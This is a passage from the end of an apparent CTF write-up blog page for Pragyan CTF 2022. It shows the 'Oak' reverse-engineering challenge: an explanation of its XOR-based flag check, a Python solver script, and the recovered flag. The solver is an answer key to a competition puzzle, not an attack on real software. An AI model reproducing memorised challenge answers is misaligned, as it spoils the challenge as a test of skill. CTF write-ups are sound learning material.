style="color:#555">,</span> 1021482L <span style="color:#555">};</span>
</span></span><span style="display:flex;"><span>    <span style="color:#555">}</span>
</span></span><span style="display:flex;"><span><span style="color:#555">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Basically, what it do is it will compare our converted flag value with <code>Oak.data ^ t(i*i)</code>. <code>t(i*i</code> value can be easily generated (Just rewrite the <code>t</code> function on python), so we know the value of <code>Oak.data ^ t(i*i)</code>. Now, let&rsquo;s move to the <code>conv</code> function.
Basically, what it do is only <code>flag[i] &lt;&lt; 8 + flag[i+1]</code>. And because we know the first char should be <code>p</code> (Because the flag is started with <code>p_ctf</code>), we can iteratively recover the flag. Below is the solver script</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">import</span> <span style="color:#0cf;font-weight:bold">sys</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">import</span> <span style="color:#0cf;font-weight:bold">string</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sys<span style="color:#555">.</span>setrecursionlimit(<span style="color:#f60">2500</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>arr <span style="color:#555">=</span> []
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> _ <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#f60">39</span>):
</span></span><span style="display:flex;"><span>    arr<span style="color:#555">.</span>append(<span style="color:#555">-</span><span style="color:#f60">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>data <span style="color:#555">=</span> [ <span style="color:#f60">28767</span>, <span style="color:#f60">24418</span>, <span style="color:#f60">25470</span>, <span style="color:#f60">29771</span>, <span style="color:#f60">26355</span>, <span style="color:#f60">31349</span>, <span style="color:#f60">13032</span>, <span style="color:#f60">30456</span>, <span style="color:#f60">14663</span>, <span style="color:#f60">27592</span>, <span style="color:#f60">8916</span>, <span style="color:#f60">29409</span>, <span style="color:#f60">7348</span>, <span style="color:#f60">17474</span>, <span style="color:#f60">5124</span>, <span style="color:#f60">3345</span>, <span style="color:#f60">49357</span>, <span style="color:#f60">61058</span>, <span style="color:#f60">65159</span>, <span style="color:#f60">53773</span>, <span style="color:#f60">67886</span>, <span style="color:#f60">72426</span>, <span style="color:#f60">103728</span>, <span style="color:#f60">158125</span>, <span style="color:#f60">179542</span>, <span style="color:#f60">166504</span>, <span style="color:#f60">212101</span>, <span style="color:#f60">282674</span>, <span style="color:#f60">320873</span>, <span style="color:#f60">329272</span>, <span style="color:#f60">400021</span>, <span style="color:#f60">479881</span>, <span style="color:#f60">535081</span>, <span style="color:#f60">599886</span>, <span style="color:#f60">662294</span>, <span style="color:#f60">731441</span>, <span style="color:#f60">831284</span>, <span style="color:#f60">947032</span>, <span style="color:#f60">1021482</span> ]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">t_helper</span>(n):
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">global</span> arr
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> arr[n] <span style="color:#555">!=</span> <span style="color:#555">-</span><span style="color:#f60">1</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">return</span> arr[n]
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> n <span style="color:#555">==</span> <span style="color:#f60">0</span>:
</span></span><span style="display:flex;"><span>        arr[<span style="color:#f60">0</span>] <span style="color:#555">=</span> <span style="color:#f60">0</span>
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">return</span> arr[<span style="color:#f60">0</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> n <span style="color:#555">==</span> <span style="color:#f60">1</span>:
</span></span><span style="display:flex;"><span>        arr[<span style="color:#f60">1</span>] <span style="color:#555">=</span> <span style="color:#f60">1</span>
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">return</span> arr[<span style="color:#f60">1</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> n <span style="color:#555">==</span> <span style="color:#f60">2</span>:
</span></span><span style="display:flex;"><span>        arr[<span style="color:#f60">2</span>] <span style="color:#555">=</span> <span style="color:#f60">3</span>
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">return</span> arr[<span style="color:#f60">2</span>]
</span></span><span style="display:flex;"><span>    arr[n] <span style="color:#555">=</span> <span style="color:#f60">3</span> <span style="color:#555">*</span> t_helper(n <span style="color:#555">-</span> <span style="color:#f60">1</span>) <span style="color:#555">-</span> <span style="color:#f60">3</span> <span style="color:#555">*</span> t_helper(n <span style="color:#555">-</span> <span style="color:#f60">2</span>) <span style="color:#555">+</span> t_helper(n <span style="color:#555">-</span> <span style="color:#f60">3</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> arr[n]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">t</span>(n):
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">global</span> arr
</span></span><span style="display:flex;"><span>    arr <span style="color:#555">=</span> []
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">for</span> _ <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#f60">39</span><span style="color:#555">*</span><span style="color:#f60">39</span><span style="color:#555">+</span><span style="color:#f60">1</span>):
</span></span><span style="display:flex;"><span>        arr<span style="color:#555">.</span>append(<span style="color:#555">-</span><span style="color:#f60">1</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> t_helper(n)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Generate Oak.data[i]^t(i*i)</span>
</span></span><span style="display:flex;"><span>xored_data <span style="color:#555">=</span> []
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#f60">39</span>):
</span></span><span style="display:flex;"><span>    res <span style="color:#555">=</span> t(i<span style="color:#555">*</span>i)
</span></span><span style="display:flex;"><span>    xored_data<span style="color:#555">.</span>append(data[i]<span style="color:#555">^</span>res)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Iteratively recover flag by assuming the first char of the flag is &#34;p&#34;</span>
</span></span><span style="display:flex;"><span>flag <span style="color:#555">=</span> <span style="color:#c30">&#39;p&#39;</span>
</span></span><span style="display:flex;"><span>prev_char <span style="color:#555">=</span> <span style="color:#c30">&#39;p&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> num <span style="color:#000;font-weight:bold">in</span> xored_data[:<span style="color:#555">-</span><span style="color:#f60">1</span>]:
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">for</span> ch <span style="color:#000;font-weight:bold">in</span> string<span style="color:#555">.</span>printable:
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> ((<span style="color:#366">ord</span>(prev_char) <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">8</span>) <span style="color:#555">+</span> <span style="color:#366">ord</span>(ch)) <span style="color:#555">==</span> num:
</span></span><span style="display:flex;"><span>            flag <span style="color:#555">+=</span> ch
</span></span><span style="display:flex;"><span>            prev_char <span style="color:#555">=</span> ch
</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">break</span>
</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#39;Flag: </span><span style="color:#a00">{</span>flag<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Flag: p_ctf{0r1g1n4|_<em>n@M3-0f_J4vA_Wa5</em>()/|&lt;}</p>
</blockquote>

      </div>
      
        
  <aside class="toc-container">
    <a href="#" style="font-weight: 700; color: black;">Pragyan CTF 2022</a>
    <div class="js-toc">
      <details>
          <summary>Table of Contents
          </summary>
          <div>
              <nav id="TableOfContents">
  <ul>
    <li><a href="#pwn">Pwn</a>
      <ul>
        <li><a href="#database">Database</a></li>
        <li><a href="#poly-flow">Poly-Flow</a></li>
        <li><a href="#portal">Portal</a></li>
      </ul>
    </li>
    <li><a href="#web">Web</a>
      <ul>
        <li><a href="#php-train">PHP Train</a></li>
        <li><a href="#inception">Inception</a></li>
        <li><a href="#code-of-chaos">Code of Chaos</a></li>
      </ul>
    </li>
    <li><a href="#crypto">Crypto</a>
      <ul>
        <li><a href="#one-try">One Try</a></li>
        <li><a href="#blind-scout">Blind Scout</a></li>
      </ul>
    </li>
    <li><a href="#rev">Rev</a>
      <ul>
        <li><a href="#oak">Oak</a></li>
      </ul>
    </li>
  </ul>
</nav>
          </div>
      </details>
    </div>
  </aside>


      
    </div>

    
        <div class="tags">
            
                <a href="https://chovid99.github.io/tags/writeup">Writeup</a>
            
                <a href="https://chovid99.github.io/tags/pragyanctf">PragyanCTF</a>
            
                <a href="https://chovid99.github.io/tags/php">php</a>
            
                <a href="https://chovid99.github.io/tags/web">web</a>
            
                <a href="https://chovid99.github.io/tags/z3">z3</a>
            
                <a href="https://chovid99.github.io/tags/crypto">crypto</a>
            
                <a href="https://chovid99.github.io/tags/heap">heap</a>
            
                <a href="https://chovid99.github.io/tags/pwn">pwn</a>
            
                <a href="https://chovid99.github.io/tags/format-string">format string</a>
            
                <a href="https://chovid99.github.io/tags/2022">2022</a>
            
        </div>
    
    
    
  <div id="comment">
    
    
  </div>


</section>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="/js/tocbot.min.js"></script>

<script type="text/javascript">
  tocbot.init({
      
      tocSelector: '.js-toc',
      
      contentSelector: '.js-toc-content',
      headingSelector: 'h1, h2, h3',
      orderedList: false,
      headingLabelCallback: s => s.substr(0, s.length-2),
      collapseDepth: 2
  });
  function initTOC() {
    var windowWidth = 1316;
    var $block_2 = $(".toc-container");
    var lastLeft = parseFloat($block_2.css("left").slice(0, -2))*(100/($(window).width()));
    $block_2.css("left", (lastLeft/lastWindowWidth)*$(window).width() + "vw");
  }
  window.onload = initTOC;

  var lastWindowWidth = $(window).width();
  $(window).resize(function() {
    var $block_2 = $(".toc-container");
    var lastLeft = parseFloat($block_2.css("left").slice(0, -2))*(100/($(window).width()));
    console.log("hehe", (lastLeft/lastWindowWidth)*$(window).width() + "vw")
    $block_2.css("left", (lastLeft/lastWindowWidth)*$(window).width() + "vw");
    lastWindowWidth = $(window).width();
  });
</script>

    </main>
    
    <footer id="footer">
    
        <div id="social">


    <a class="symbol" href="https://github.com/Chovid99" rel="me" target="_blank">
        
        <svg fill="#bbbbbb" width="28" height="28"  viewBox="0 0 72 72" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    
    <title>Github</title>
    <desc>Created with Sketch.</desc>
    <defs></defs>
    <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
        <g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)">
            <g id="Github" transform="translate(264.000000, 939.000000)">
                <path d="M8,72 L64,72 C68.418278,72 72,68.418278 72,64 L72,8 C72,3.581722 68.418278,-8.11624501e-16 64,0 L8,0 C3.581722,8.11624501e-16 -5.41083001e-16,3.581722 0,8 L0,64 C5.41083001e-16,68.418278 3.581722,72 8,72 Z" id="Rounded" fill="#bbbbbb"></path>
                <path d="M35.9985,13 C22.746,13 12,23.7870921 12,37.096644 C12,47.7406712 18.876,56.7718301 28.4145,59.9584121 C29.6145,60.1797862 30.0525,59.4358488 30.0525,58.7973276 C30.0525,58.2250681 30.0315,56.7100863 30.0195,54.6996482 C23.343,56.1558981 21.9345,51.4693938 21.9345,51.4693938 C20.844,48.6864054 19.2705,47.9454799 19.2705,47.9454799 C17.091,46.4500754 19.4355,46.4801943 19.4355,46.4801943 C21.843,46.6503662 23.1105,48.9634994 23.1105,48.9634994 C25.2525,52.6455377 28.728,51.5823398 30.096,50.9649018 C30.3135,49.4077535 30.9345,48.3460615 31.62,47.7436831 C26.2905,47.1352808 20.688,45.0691228 20.688,35.8361671 C20.688,33.2052792 21.6225,31.0547881 23.1585,29.3696344 C22.911,28.7597262 22.0875,26.3110578 23.3925,22.9934585 C23.3925,22.9934585 25.4085,22.3459017 29.9925,25.4632101 C31.908,24.9285993 33.96,24.6620468 36.0015,24.6515052 C38.04,24.6620468 40.0935,24.9285993 42.0105,25.4632101 C46.5915,22.3459017 48.603,22.9934585 48.603,22.9934585 C49.9125,26.3110578 49.089,28.7597262 48.8415,29.3696344 C50.3805,31.0547881 51.309,33.2052792 51.309,35.8361671 C51.309,45.0917119 45.6975,47.1292571 40.3515,47.7256117 C41.2125,48.4695491 41.9805,49.9393525 41.9805,52.1877301 C41.9805,55.4089489 41.9505,58.0067059 41.9505,58.7973276 C41.9505,59.4418726 42.3825,60.1918338 43.6005,59.9554002 C53.13,56.7627944 60,47.7376593 60,37.096644 C60,23.7870921 49.254,13 35.9985,13" fill="#FFFFFF"></path>
            </g>
        </g>
    </g>
</svg>
    </a>

    <a class="symbol" href="https://twitter.com/Chovid99" rel="me" target="_blank">
        
        <svg fill="#bbbbbb" width="28" height="28" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 width="438.536px" height="438.536px" viewBox="0 0 438.536 438.536" style="enable-background:new 0 0 438.536 438.536;"
	 xml:space="preserve">
<g>
	<path d="M414.41,24.123C398.333,8.042,378.963,0,356.315,0H82.228C59.58,0,40.21,8.042,24.126,24.123
		C8.045,40.207,0.003,59.576,0.003,82.225v274.084c0,22.647,8.042,42.018,24.123,58.102c16.084,16.084,35.454,24.126,58.102,24.126
		h274.084c22.648,0,42.018-8.042,58.095-24.126c16.084-16.084,24.126-35.454,24.126-58.102V82.225
		C438.532,59.576,430.49,40.204,414.41,24.123z M335.471,168.735c0.191,1.713,0.288,4.278,0.288,7.71
		c0,15.989-2.334,32.025-6.995,48.104c-4.661,16.087-11.8,31.504-21.416,46.254c-9.606,14.749-21.074,27.791-34.396,39.115
		c-13.325,11.32-29.311,20.365-47.968,27.117c-18.648,6.762-38.637,10.143-59.953,10.143c-33.116,0-63.76-8.952-91.931-26.836
		c4.568,0.568,9.329,0.855,14.275,0.855c27.6,0,52.439-8.565,74.519-25.7c-12.941-0.185-24.506-4.179-34.688-11.991
		c-10.185-7.803-17.273-17.699-21.271-29.691c4.947,0.76,8.658,1.137,11.132,1.137c4.187,0,9.042-0.76,14.56-2.279
		c-13.894-2.669-25.598-9.562-35.115-20.697c-9.519-11.136-14.277-23.84-14.277-38.114v-0.571
		c10.085,4.755,19.602,7.229,28.549,7.422c-17.321-11.613-25.981-28.265-25.981-49.963c0-10.66,2.758-20.747,8.278-30.264
		c15.035,18.464,33.311,33.213,54.816,44.252c21.507,11.038,44.54,17.227,69.092,18.558c-0.95-3.616-1.427-8.186-1.427-13.704
		c0-16.562,5.853-30.692,17.56-42.399c11.703-11.706,25.837-17.561,42.394-17.561c17.515,0,32.079,6.283,43.688,18.846
		c13.134-2.474,25.892-7.33,38.26-14.56c-4.757,14.652-13.613,25.788-26.55,33.402c12.368-1.716,23.88-4.95,34.537-9.708
		C357.458,149.793,347.462,160.166,335.471,168.735z"/>
</g>
</svg>

    </a>


</div>

    

    <div class="copyright">
    
       ¬© Copyright 
       2022 
       <span class="split">
        <svg fill="#bbbbbb" width="15" height="15" version="1.1" id="heart-15" xmlns="http://www.w3.org/2000/svg" width="15px" height="15px" viewBox="0 0 15 15">
  <path d="M13.91,6.75c-1.17,2.25-4.3,5.31-6.07,6.94c-0.1903,0.1718-0.4797,0.1718-0.67,0C5.39,12.06,2.26,9,1.09,6.75&#xA;&#x9;C-1.48,1.8,5-1.5,7.5,3.45C10-1.5,16.48,1.8,13.91,6.75z"/>
</svg>
       </span>
       Chovid99
    
    </div>

    
</footer>



  </body>
</html>
